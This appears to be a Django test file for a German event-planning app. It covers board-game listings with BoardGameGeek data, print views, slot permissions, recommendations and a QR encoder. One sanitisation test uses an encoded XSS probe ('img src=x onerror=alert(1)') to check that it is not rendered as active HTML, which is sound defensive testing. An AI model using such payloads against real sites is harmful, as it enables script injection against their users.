        response = self.client.get(f"/{self.event.pk}/spiele/erklaerbaeren/drucken/")
        self.assertRedirects(response, f"/{self.event.pk}/", fetch_redirect_response=False)


class GameBggAndExplainerDisplayTests(TestCase):
    def setUp(self):
        self.owner = User.objects.create(username="display-host", email="display@example.com")
        self.event = Event.objects.create(title="Spieleabend", created_by=self.owner)
        self.game = GameEntry.objects.create(
            event=self.event, created_by=self.owner, name="Catan", bgg_id=13,
            bgg_categories=["Civilization", "Unknown category"],
            bgg_mechanics=["Dice Rolling"], bgg_description="Original description",
        )
        self.client = Client(SERVER_NAME="localhost")
        self.client.force_login(self.owner)

    def test_german_bgg_details_in_popup_and_expanded_entry(self):
        response = self.client.get(f"/{self.event.pk}/")
        self.assertContains(response, "Zivilisation, Unknown category", count=2)
        self.assertContains(response, "<dd>Würfeln</dd>", count=2, html=True)
        self.assertContains(response, "Kurzbeschreibung (BGG-Original)", count=2)
        self.assertContains(response, 'class="game-detail-section game-bgg-expanded"')
        self.assertContains(response, 'data-categories="zivilisation, unknown category"')

    def test_missing_explainer_badge(self):
        response = self.client.get(f"/{self.event.pk}/")
        self.assertContains(response, 'class="game-explain-toggle is-missing"')
        self.assertContains(response, 'aria-label="0 Erklärbären für Catan"')
        self.assertContains(response, "Noch keine Erklärbären angemeldet.")

    def test_explainer_count_excludes_cancelled_attendees(self):
        from .models import GameExplainClaim
        other = User.objects.create(username="cancelled-explainer")
        Attendance.objects.create(event=self.event, user=self.owner, name="Host")
        GameExplainClaim.objects.create(game=self.game, user=self.owner)
        GameExplainClaim.objects.create(game=self.game, user=other)
        response = self.client.get(f"/{self.event.pk}/")
        self.assertContains(response, 'aria-label="1 Erklärbären für Catan"')
        self.assertNotContains(response, 'class="game-explain-toggle is-missing"')
        html = response.content.decode()
        popup = html.split(f'id="game-explain-popup-{self.game.pk}"', 1)[1].split('</span>\n                                        </span>', 1)[0]
        self.assertIn("display-host", popup)
        self.assertNotIn("cancelled-explainer", popup)

    def test_planning_event_counts_explainers_without_attendance(self):
        from .models import GameExplainClaim
        self.event.planning_enabled = True
        self.event.save(update_fields=["planning_enabled"])
        GameExplainClaim.objects.create(game=self.game, user=self.owner)
        self.assertContains(self.client.get(f"/{self.event.pk}/"), 'aria-label="1 Erklärbären für Catan"')

    def test_labels_keep_unknown_values_and_support_missing_data(self):
        from .bgg_labels import german_labels
        self.assertEqual(german_labels(["Cooperative Game", "Custom"]), ["Kooperatives Spiel", "Custom"])
        self.assertEqual(german_labels(None), [])


class GamePrintDescriptionTests(TestCase):
    def test_print_keeps_complete_bgg_description_and_decodes_entities(self):
        from types import SimpleNamespace
        from django.template.loader import render_to_string
        text = '<p>Start &mdash; &quot;Wort&quot; &amp; mehr.</p><p>' + 'Langer Text. ' * 300 + 'ENDE</p><ul><li>Erster Punkt</li><li>Zweiter Punkt</li></ul>'
        game = SimpleNamespace(name="One Round", description="", bgg_description=text, explain_claims=SimpleNamespace(all=[]))
        html = render_to_string("events/game_explain_print.html", {"event": SimpleNamespace(pk=1, title="Test"), "games": [game]})
        self.assertIn('Start — &quot;Wort&quot; &amp; mehr.<br>', html)
        self.assertIn('ENDE<br>• Erster Punkt<br>• Zweiter Punkt', html)
        self.assertEqual(html.count('Langer Text.'), 300)
        self.assertNotIn('&amp;mdash;', html)

    def test_manual_description_keeps_complete_text_and_markdown(self):
        from types import SimpleNamespace
        from django.template.loader import render_to_string
        game = SimpleNamespace(name="Test", description='**Fett**\n- Punkt\n' + 'Text ' * 100 + 'ENDE', bgg_description='Fallback', explain_claims=SimpleNamespace(all=[]))
        html = render_to_string("events/game_explain_print.html", {"event": SimpleNamespace(pk=1, title="Test"), "games": [game]})
        self.assertIn('<strong>Fett</strong>', html)
        self.assertIn('<li>Punkt</li>', html)
        self.assertIn('ENDE', html)
        self.assertNotIn('Fallback', html)

    def test_decoded_markup_is_not_rendered_as_active_html(self):
        from django.template import Context, Template
        html = Template('{% load events_extras %}{{ value|bgg_description_text|linebreaksbr }}').render(Context({'value': '&lt;img src=x onerror=alert(1)&gt;Text &mdash; Ende'}))
        self.assertEqual(html, 'Text — Ende')


@override_settings(STORAGES={
    "default": {"BACKEND": "django.core.files.storage.FileSystemStorage"},
    "staticfiles": {"BACKEND": "django.contrib.staticfiles.storage.StaticFilesStorage"},
})
class SlotManagementTests(TestCase):
    def setUp(self):
        self.orga = User.objects.create_user(username="slot-orga")
        self.owner = User.objects.create_user(username="slot-owner")
        self.other = User.objects.create_user(username="slot-other")
        self.event = Event.objects.create(title="Workshops", created_by=self.orga, auto_readonly=False)
        self.day = EventDay.objects.create(event=self.event, date=datetime.date(2026, 9, 22))
        self.slot = Slot.objects.create(event=self.event, day=self.day, title="Workshop",
            start_time="10:00", end_time="11:00", max_participants=2, created_by=self.owner)
        self.signup = SlotSignup.objects.create(slot=self.slot, user=self.other)
        self.client = Client(SERVER_NAME="localhost")

    def test_owner_and_orga_can_edit_without_losing_signups(self):
        for user in (self.owner, self.orga):
            with self.subTest(user=user.username):
                self.client.force_login(user)
                response = self.client.get(f"/slots/{self.slot.pk}/bearbeiten/")
                self.assertContains(response, "Speichern")
                response = self.client.post(f"/slots/{self.slot.pk}/bearbeiten/", {
                    "day": self.day.pk, "title": "Neuer Titel", "description": "Details",
                    "start_time": "12:00", "end_time": "13:00", "max_participants": 3,
                })
                self.assertEqual(response.status_code, 302)
                self.slot.refresh_from_db()
                self.assertEqual(self.slot.title, "Neuer Titel")
                self.assertEqual(self.slot.created_by, self.owner)
                self.assertTrue(SlotSignup.objects.filter(pk=self.signup.pk).exists())

    def test_actions_and_warning_visible_only_to_owner_and_orga(self):
        for user in (self.owner, self.orga, self.other):
            self.client.force_login(user)
            response = self.client.get(f"/{self.event.pk}/")
            for action in ("bearbeiten", "loeschen"):
                url = f"/slots/{self.slot.pk}/{action}/"
                if user == self.other:
                    self.assertNotContains(response, url)
                else:
                    self.assertContains(response, url)
                    self.assertContains(response, "Dabei gehen alle Anmeldungen einschließlich der Warteliste")

    def test_unrelated_user_cannot_edit_or_delete(self):
        self.client.force_login(self.other)
        self.assertEqual(self.client.get(f"/slots/{self.slot.pk}/bearbeiten/").status_code, 403)
        for action in ("bearbeiten", "loeschen"):
            self.assertEqual(self.client.post(f"/slots/{self.slot.pk}/{action}/").status_code, 403)
        self.assertTrue(SlotSignup.objects.filter(pk=self.signup.pk).exists())

    def test_delete_requires_post_and_removes_signups_for_owner_and_orga(self):
        for user in (self.owner, self.orga):
            self.client.force_login(user)
            slot = Slot.objects.create(event=self.event, day=self.day, title="Löschen",
                start_time="10:00", end_time="11:00", max_participants=1, created_by=self.owner)
            signup = SlotSignup.objects.create(slot=slot, user=self.other)
            url = f"/slots/{slot.pk}/loeschen/"
            self.assertEqual(self.client.get(url).status_code, 405)
            self.assertTrue(Slot.objects.filter(pk=slot.pk).exists())
            response = self.client.post(url)
            self.assertRedirects(response, f"/{self.event.pk}/#slots-section")
            self.assertFalse(Slot.objects.filter(pk=slot.pk).exists())
            self.assertFalse(SlotSignup.objects.filter(pk=signup.pk).exists())

    def test_edit_rejects_day_from_another_event(self):
        event = Event.objects.create(title="Andere Veranstaltung", created_by=self.orga)
        day = EventDay.objects.create(event=event, date=self.day.date)
        self.client.force_login(self.owner)
        response = self.client.post(f"/slots/{self.slot.pk}/bearbeiten/", {
            "day": day.pk, "title": "Falscher Tag", "start_time": "10:00",
            "end_time": "11:00", "max_participants": 2,
        })
        self.assertEqual(response.status_code, 200)
        self.assertIn("day", response.context["form"].errors)
        self.slot.refresh_from_db()
        self.assertEqual(self.slot.day, self.day)


class ListPrintTests(TestCase):
    def setUp(self):
        self.owner = User.objects.create_user(username="print-host")
        self.helper = User.objects.create_user(username="print-helper")
        self.event = Event.objects.create(title="Drucktest", created_by=self.owner)
        Attendance.objects.create(event=self.event, user=self.owner)
        self.client = Client(SERVER_NAME="localhost")
        self.client.force_login(self.owner)

    def test_potluck_print_shows_names_quantities_and_open_items(self):
        salad = PotluckItem.objects.create(event=self.event, title="Salat", needed_quantity=3, unit="Schüsseln")
        PotluckItem.objects.create(event=self.event, title="Brot")
        PotluckClaim.objects.create(item=salad, user=self.owner, quantity=1, comment="Nudelsalat")
        PotluckClaim.objects.create(item=salad, name="Oma Erna", quantity=1)
        PotluckClaim.objects.create(item=salad, user=self.helper, quantity=1)
        response = self.client.get(f"/{self.event.pk}/mitbringliste/drucken/")
        self.assertContains(response, "<b>print-host</b> 1 Schüsseln")
        self.assertNotContains(response, "Nudelsalat")
        self.assertContains(response, "<b>Oma Erna</b>")
        self.assertContains(response, "<b>print-helper</b> 1 Schüsseln <span class=\"note\">(nicht angemeldet)</span>")
        self.assertContains(response, "1 von 3 Schüsseln offen")
        self.assertContains(response, 'class="write-in"', count=2)
        self.assertContains(response, "@media print")
        detail = self.client.get(f"/{self.event.pk}/")
        self.assertContains(detail, f'href="/{self.event.pk}/mitbringliste/drucken/"')

    def test_duty_print_groups_slots_with_names_springer_and_free_spots(self):
        day = EventDay.objects.create(event=self.event, date=datetime.date(2026, 11, 7))
        bar = Duty.objects.create(event=self.event, title="Theke", day=day, start_time=datetime.time(14),
                                  end_time=datetime.time(16), needed_people=2)
        Duty.objects.create(event=self.event, title="Springer", day=day, start_time=datetime.time(14),
                            end_time=datetime.time(16))
        setup = Duty.objects.create(event=self.event, title="Tische stellen", category="setup", day=day,
                                    start_time=datetime.time(9))
        DutySignup.objects.create(duty=bar, user=self.owner)
        DutySignup.objects.create(duty=bar, user=self.helper, is_reserve=True)
        DutySignup.objects.create(duty=setup, user=self.owner)
        response = self.client.get(f"/{self.event.pk}/dienste/drucken/")
        html = response.content.decode()
        self.assertIn("14:00–16:00 Uhr", html)
        self.assertIn("<h2>Dienstplan</h2>", html)
        self.assertIn("<h2>Aufbau</h2>", html)
        self.assertNotIn("<h2>Abbau</h2>", html)
        self.assertEqual(html.count("<b>print-host</b>"), 2)
        self.assertIn("<b>print-helper</b> <span class=\"note\">(nicht angemeldet)</span>", html)
        self.assertIn("1/2", html)
        self.assertEqual(html.count('class="write-in"'), 1)
        self.assertLess(html.index("Theke"), html.index("Tische stellen"))
        detail = self.client.get(f"/{self.event.pk}/")
        self.assertContains(detail, f'href="/{self.event.pk}/dienste/drucken/"')

    def test_print_views_require_event_access(self):
        self.event.set_access_password("secret")
        self.event.save()
        self.client.logout()
        for path in ("mitbringliste", "dienste"):
            response = self.client.get(f"/{self.event.pk}/{path}/drucken/")
            self.assertRedirects(response, f"/{self.event.pk}/", fetch_redirect_response=False)


class GameRecommendationTests(TestCase):
    def setUp(self):
        self.owner = User.objects.create_user(username="reco-host")
        self.event = Event.objects.create(title="Empfehlungen", created_by=self.owner)
        self.client = Client(SERVER_NAME="localhost")
        self.client.force_login(self.owner)

    def game(self, name, **fields):
        return GameEntry.objects.create(event=self.event, name=name, created_by=self.owner, **fields)

    def test_categories_follow_bgg_data(self):
        from .game_recommendations import game_recommendations
        games = [
            self.game("Codenames", min_players=2, max_players=8, playtime_minutes=15, min_age=14,
                      complexity=Decimal("1.3"), bgg_categories=["Party Game", "Word Game"],
                      bgg_mechanics=["Team-Based Game", "Communication Limits"]),
            self.game("Patchwork", min_players=2, max_players=2, playtime_minutes=30, min_age=8,
                      complexity=Decimal("1.6")),
            self.game("Pandemie", min_players=2, max_players=4, playtime_minutes=45, min_age=8,
                      complexity=Decimal("2.4"), bgg_mechanics=["Cooperative Game"]),
            self.game("Brass", min_players=2, max_players=4, playtime_minutes=120, min_age=14,
                      complexity=Decimal("3.9")),
            self.game("Ohne Daten"),
        ]
        groups = {title: [g.name for g in selected] for title, _, selected, _ in game_recommendations(games)}
        self.assertEqual(groups["Leicht für große Runden"], ["Codenames"])
        self.assertNotIn("Große Runden mit mehr Tiefgang", groups)
        self.assertEqual(groups["Zu zweit"], ["Patchwork", "Pandemie", "Brass"])
        self.assertEqual(groups["Kooperativ"], ["Pandemie"])
        self.assertEqual(groups["Mit Kindern"], ["Patchwork", "Pandemie"])
        self.assertEqual(groups["Familienspiele"], ["Codenames", "Patchwork"])
        self.assertEqual(groups["Kennerspiele"], ["Pandemie"])
        self.assertEqual(groups["Komplexe Spiele"], ["Brass"])
        self.assertEqual(groups["Schnelle Spiele"], ["Codenames", "Patchwork"])
        self.assertEqual(groups["Abendfüllend"], ["Brass"])
        self.assertEqual(groups["Wort- & Kommunikationsspiele"], ["Codenames"])
        self.assertNotIn("Geschicklichkeit", groups)
        self.assertNotIn("Ohne Daten", sum(groups.values(), []))

    def test_unrated_complexity_zero_counts_as_unknown(self):
        from .game_recommendations import game_recommendations
        games = [self.game("Assano", min_players=2, complexity=Decimal("0"))]
        titles = [title for title, *_ in game_recommendations(games)]
        self.assertNotIn("Familienspiele", titles)

    def test_groups_are_capped_explainers_first_then_rating(self):
        from .game_recommendations import game_recommendations
        games = [self.game(f"Spiel {i:02}", min_players=2, max_players=4, bgg_rating=Decimal(i),
                           complexity=Decimal("2.5")) for i in range(1, 12)]
        games.append(self.game("Kaum bewertet", min_players=2, max_players=4, bgg_rating=Decimal("9.9")))
        GameExplainClaim.objects.create(game=games[0], user=self.owner)
        (title, _, shown, more), = [g for g in game_recommendations(games, limit=3) if g[0] == "Zu zweit"]
        self.assertEqual([g.name for g in shown], ["Spiel 01", "Spiel 10", "Spiel 11"])
        self.assertEqual(more, 9)
        html = self.client.get(f"/{self.event.pk}/spiele/erklaerbaeren/drucken/").content.decode()
        self.assertIn("und 2 weitere", html)
        self.assertIn("Je Kategorie bis zu 10 Spiele", html)

    def test_print_starts_with_linked_overview(self):
        game = self.game("Patchwork", min_players=2, max_players=2)
        html = self.client.get(f"/{self.event.pk}/spiele/erklaerbaeren/drucken/").content.decode()
        self.assertIn("Spieleempfehlungen", html)
        self.assertIn(f'<a href="#game-{game.pk}">Patchwork</a>', html)
        self.assertIn(f'id="game-{game.pk}"', html)
        self.assertLess(html.index("Spieleempfehlungen"), html.index('class="game-list"'))


class GameSummaryTests(TestCase):
    def test_print_prefers_summary_over_long_description(self):
        game = SimpleNamespace(name="Catan", summary="Kurz und knapp.\nZweite Zeile", description="Lang",
                               bgg_description="BGG lang", explain_claims=SimpleNamespace(all=[]))
        html = render_to_string("events/game_explain_print.html", {"event": SimpleNamespace(pk=1, title="Test"), "games": [game]})
        self.assertIn("Kurz und knapp.<br>Zweite Zeile", html)
        self.assertNotIn("BGG lang", html)

    def test_game_form_offers_summary(self):
        from .forms import GameEntryForm
        self.assertIn("summary", GameEntryForm().fields)


class GameQrCodeTests(TestCase):
    def test_qr_encoder_builds_valid_function_patterns(self):
        from .qr import qr_matrix, qr_svg
        matrix = qr_matrix("https://boardgamegeek.com/boardgame/451387")
        self.assertEqual(len(matrix), 29)  # Version 3 reicht für 42 Byte bei Stufe M
        finder = [row[:7] for row in matrix[:7]]
        self.assertEqual(finder[0], [True] * 7)
        self.assertEqual(finder[1], [True] + [False] * 5 + [True])
        self.assertEqual(finder[3], [True, False, True, True, True, False, True])
        timing = range(8, len(matrix) - 8)
        self.assertEqual([matrix[6][x] for x in timing], [x % 2 == 0 for x in timing])
        self.assertTrue(matrix[len(matrix) - 8][8])  # Dark Module
        svg = qr_svg("https://example.org/?a=<b>", "Test")
        size = len(qr_matrix("https://example.org/?a=<b>")) + 8
        self.assertIn(f'viewBox="0 0 {size} {size}"', svg)
        self.assertNotIn("<b>", svg)

    def test_print_links_qr_code_to_bgg(self):
        owner = User.objects.create_user(username="qr-host")
        event = Event.objects.create(title="QR", created_by=owner)
        GameEntry.objects.create(event=event, name="Catan", bgg_id=13, created_by=owner)
        GameEntry.objects.create(event=event, name="Eigenbau", created_by=owner)
        client = Client(SERVER_NAME="localhost")
        client.force_login(owner)
        html = client.get(f"/{event.pk}/spiele/erklaerbaeren/drucken/").content.decode()
        self.assertIn('<a class="game-qr" href="https://boardgamegeek.com/boardgame/13"><svg class="qr"', html)
        self.assertEqual(html.count('<svg class="qr"'), 1)


class OwnEntryMarkerTests(TestCase):
    """Eigene Zusagen und Eintragungen werden in allen Listen grün markiert."""

    def setUp(self):
        self.me = User.objects.create_user(username="ich")
        self.other = User.objects.create_user(username="andere")
        self.event = Event.objects.create(title="Markierungstest", created_by=self.other)
        day = EventDay.objects.create(event=self.event, date=datetime.date(2026, 9, 5))
        self.game = GameEntry.objects.create(event=self.event, name="Catan", created_by=self.other)
        self.item = PotluckItem.objects.create(event=self.event, title="Brot")
        self.duty = Duty.objects.create(
            event=self.event, title="Kasse", day=day,
            start_time=datetime.time(10, 0), end_time=datetime.time(12, 0), created_by=self.other,
        )
        self.slot = Slot.objects.create(
            event=self.event, day=day, title="Workshop", start_time=datetime.time(14, 0),
            end_time=datetime.time(15, 0), max_participants=5, created_by=self.other,
        )
        self.client = Client(SERVER_NAME="localhost")
        self.client.force_login(self.me)

    def test_markers_only_for_own_entries(self):
        for user in (self.other, self.me):
            GameBringClaim.objects.create(game=self.game, user=user)
            PotluckClaim.objects.create(item=self.item, user=user)
            DutySignup.objects.create(duty=self.duty, user=user)
            SlotSignup.objects.create(slot=self.slot, user=user)
            response = self.client.get(f"/{self.event.pk}/")
            mine = user == self.me
            for text in ("Du bringst es mit", "Du bist eingetragen", "Du bist angemeldet"):
                (self.assertContains if mine else self.assertNotContains)(response, text)
            self.assertEqual(response.content.decode().count("Du bringst es mit"), 2 if mine else 0)

    def test_springer_marker(self):
        DutySignup.objects.create(duty=self.duty, user=self.me, is_reserve=True)
        response = self.client.get(f"/{self.event.pk}/")
        self.assertContains(response, "Du bist Springer")
        self.assertNotContains(response, "Du bist eingetragen")
